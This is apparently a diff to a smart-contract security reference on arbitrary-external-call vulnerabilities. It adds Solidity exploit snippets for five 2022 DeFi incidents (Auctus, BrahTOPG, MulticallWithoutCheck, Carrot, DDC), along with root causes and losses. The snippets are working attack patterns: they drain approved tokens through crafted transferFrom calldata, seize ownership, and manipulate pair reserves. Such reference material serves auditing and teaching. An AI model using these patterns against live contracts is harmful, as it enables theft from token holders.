@@ -49,6 +49,11 @@ version: ">=0.8.0"
 | [RAB-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/RabbyWallet_SwapRouter_exp.sol` |
 | [TRS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/TransitSwap_exp.sol` |
 | [SUSHI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Sushi_Router_exp.sol` |
+| [AUCTUS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-03/Auctus_exp.sol` |
+| [BRAH-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-11/BrahTOPG_exp.sol` |
+| [MULTI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/MulticallWithoutCheck_exp.sol` |
+| [CARROT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/Carrot_exp.sol` |
+| [DDC-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-08/DDC_exp.sol` |
 
 ---
 
@@ -227,6 +232,132 @@ function swap(...) external returns (int256, int256) {
 
 ---
 
+## 2. Additional Arbitrary Call Patterns (2022)
+
+Beyond swap routers, the arbitrary call pattern manifests in options writers, zappers, multicall helpers, fee distributors, and token reward functions.
+
+**Example 5: Auctus — ACOWriter Arbitrary CallData (March 2022)** [Approx Vulnerability: CRITICAL] `@audit` [AUCTUS-POC]
+
+```solidity
+// ❌ VULNERABLE: write() accepts arbitrary callData and executes it
+// Attacker supplies fake token address (their own contract) + transferFrom calldata targeting USDC
+
+// Attacker contract mocks all validation interfaces:
+function collateral() external returns (address) { return address(usdc); }
+function mintToPayable(address) external payable returns (address) { return address(this); }
+function balanceOf(address) external returns (uint256) { return 1e18; }
+
+// The attack:
+acowrite.write{value: 1}(
+    address(this),  // @audit Attacker's fake token contract
+    1,
+    address(usdc),  // Collateral token
+    abi.encodeWithSelector(
+        bytes4(keccak256("transferFrom(address,address,uint256)")),
+        victim,          // @audit Victim who approved ACOWriter
+        msg.sender,      // Attacker
+        usdc.balanceOf(victim)  // Full balance
+    )
+);
+// ACOWriter calls: fakeToken.call(transferFrom(victim, attacker, balance))
+// But callData targets USDC, not the fake token!
+```
+
+**Example 6: BrahTOPG — Zapper swapTarget Arbitrary Call (November 2022)** [Approx Vulnerability: CRITICAL] `@audit` [BRAH-POC]
+
+```solidity
+// ❌ VULNERABLE: Zapper.zapIn() accepts ZapData with arbitrary swapTarget + callData
+// Attacker sets swapTarget = USDC, callData = transferFrom(victim, attacker, amount)
+
+bytes memory data = abi.encodeWithSignature(
+    "transferFrom(address,address,uint256)", victimAddress, address(this), amount
+);
+
+Zapper.ZapData memory zapData = Zapper.ZapData({
+    requiredToken: address(this),
+    amountIn: 1,
+    minAmountOut: 0,
+    allowanceTarget: address(this),
+    swapTarget: address(USDC),  // @audit Set to USDC token contract!
+    callData: data              // @audit transferFrom(victim, attacker, amount)
+});
+
+// @audit Zapper executes: USDC.transferFrom(victim, attacker, amount)
+// Works because victim approved Zapper for USDC spending
+zappper.zapIn(zapData);
+```
+
+**Example 7: MulticallWithoutCheck — No Access Control Multicall (October 2022, Polygon)** [Approx Vulnerability: CRITICAL] `@audit` [MULTI-POC]
+
+```solidity
+// ❌ VULNERABLE: multicallWithoutCheck has NO access control
+// Anyone can call arbitrary functions on any address using the contract's context
+
+uint256 USDTBalance = USDT.balanceOf(address(target));
+
+// @audit Craft calldata to transfer ALL USDT held by target
+bytes memory data = abi.encodeWithSignature(
+    "transfer(address,uint256)", address(this), USDTBalance
+);
+
+Target.Call memory inputData = Target.Call({
+    target: address(USDT),  // @audit Call USDT.transfer()
+    callData: data,
+    value: 0
+});
+
+Target.Call[] memory calls = new Target.Call[](1);
+calls[0] = inputData;
+// @audit Anyone can call this — drains ALL tokens held by target contract
+target.multicallWithoutCheck(calls);
+```
+
+**Example 8: Carrot — transReward Arbitrary Call → Ownership Takeover ($31K, October 2022, BSC)** [Approx Vulnerability: CRITICAL] `@audit` [CARROT-POC]
+
+```solidity
+// ❌ VULNERABLE: Two-stage exploit
+// Stage 1: transReward() has no access control and executes arbitrary call to Pool
+// Stage 2: Becoming Pool owner bypasses fee/allowance checks via _isExcludedFromFee
+
+// Stage 1: Take over Pool ownership via unprotected transReward()
+// @audit transReward calls Pool with attacker-supplied selector
+CARROT_TOKEN.transReward(
+    abi.encodeWithSelector(0xbf699b4b, address(this))  // changeOwner(attacker)
+);
+
+// Stage 2: As Pool owner, _beforeTransfer adds us to _isExcludedFromFee
+// @audit transferFrom bypasses allowance check for excluded addresses
+CARROT_TOKEN.transferFrom(
+    victim,
+    address(this),
+    310_344_736_073_087_429_864_760  // Drain victim's CARROT
+);
+
+// Stage 3: Swap stolen CARROT → BUSDT (~$31K profit)
+_CARROTToBUSDT();
+```
+
+**Example 9: DDC — Public handleDeductFee Burns Pair Tokens (August 2022, BSC)** [Approx Vulnerability: HIGH] `@audit` [DDC-POC]
+
+```solidity
+// ❌ VULNERABLE: handleDeductFee() is externally callable with no access control
+// Anyone can deduct (burn) tokens from any address including the LP pair
+
+BuyDDC();  // Buy DDC with 0.1 BNB
+
+// @audit Drain DDC from pair — leaves pair with 1 token
+uint256 amount = DDC.balanceOf(address(TargetPair)) - 1;
+DDC.handleDeductFee(0, amount, address(TargetPair), address(this));
+
+// @audit Force reserve update to reflect manipulated balance
+TargetPair.sync();
+
+// @audit Sell DDC at massively inflated price (pair has almost no DDC)
+SellDDC();  // Profit in BNB
+```
+
+---
+
 ## Impact Analysis
 
 ### Technical Impact
@@ -236,7 +367,7 @@ function swap(...) external returns (int256, int256) {
 - Multi-chain impact if the same router is deployed on multiple chains
 
 ### Business Impact
-- **Total losses 2022-2023:** $26M+ (TransitSwap $21M, SushiSwap $3.3M, Rubic $1.5M, Rabby $200K)
+- **Total losses 2022-2023:** $26M+ from original 4 exploits (TransitSwap $21M, SushiSwap $3.3M, Rubic $1.5M, Rabby $200K), plus additional losses from Auctus, BrahTOPG, MulticallWithoutCheck, Carrot ($31K), DDC
 - Every user who interacted with the vulnerable contract is a potential victim
 - Requires no technical sophistication — just enumerate approvals and craft calls
 - Particularly devastating for swap aggregators with large user bases
@@ -365,6 +496,16 @@ contract SecureRouteProcessor {
   - Root cause: Router address and calldata both user-controlled, used to call transferFrom on tokens
 - **Rabby Wallet** — Arbitrary dexRouter in swap(), Ethereum — October 2022 — $200K
   - Root cause: swap() accepted any dexRouter address, calldata used to call transferFrom
+- **Auctus** — ACOWriter arbitrary callData, Ethereum — March 2022
+  - Root cause: write() executed attacker-controlled calldata, used to transferFrom USDC from approved victims
+- **BrahTOPG** — Zapper swapTarget arbitrary call, Ethereum — November 2022
+  - Root cause: zapIn() accepted arbitrary swapTarget + callData, used to drain approved USDC
+- **MulticallWithoutCheck** — No access control multicall, Polygon — October 2022
+  - Root cause: multicallWithoutCheck() callable by anyone, executed arbitrary calls with contract's context
+- **Carrot** — transReward arbitrary call → ownership takeover, BSC — October 2022 — $31K
+  - Root cause: transReward() executed arbitrary call to Pool → changeOwner → fee bypass → transferFrom
+- **DDC** — Public handleDeductFee pair drain, BSC — August 2022
+  - Root cause: handleDeductFee() externally callable, burned DDC from LP pair → sync → inflated price
 
 ---
 
@@ -389,7 +530,7 @@ contract SecureRouteProcessor {
 
 ## Keywords for Search
 
-> `arbitrary external call`, `unvalidated router`, `arbitrary calldata`, `transferFrom exploit`, `approval drain`, `low-level call`, `router exploitation`, `swap aggregator`, `dexRouter`, `Rubic exploit`, `Rabby wallet`, `TransitSwap`, `SushiSwap RouteProcessor`, `callback trust`, `uniswapV3SwapCallback`, `route bytes`, `call injection`, `delegatecall exploit`, `proxy call`, `user-controlled calldata`, `approval theft`
+> `arbitrary external call`, `unvalidated router`, `arbitrary calldata`, `transferFrom exploit`, `approval drain`, `low-level call`, `router exploitation`, `swap aggregator`, `dexRouter`, `Rubic exploit`, `Rabby wallet`, `TransitSwap`, `SushiSwap RouteProcessor`, `callback trust`, `uniswapV3SwapCallback`, `route bytes`, `call injection`, `delegatecall exploit`, `proxy call`, `user-controlled calldata`, `approval theft`, `Auctus`, `ACOWriter`, `BrahTOPG`, `Zapper`, `MulticallWithoutCheck`, `Carrot`, `transReward`, `DDC`, `handleDeductFee`, `multicall`, `zapIn`
 
 ---
 
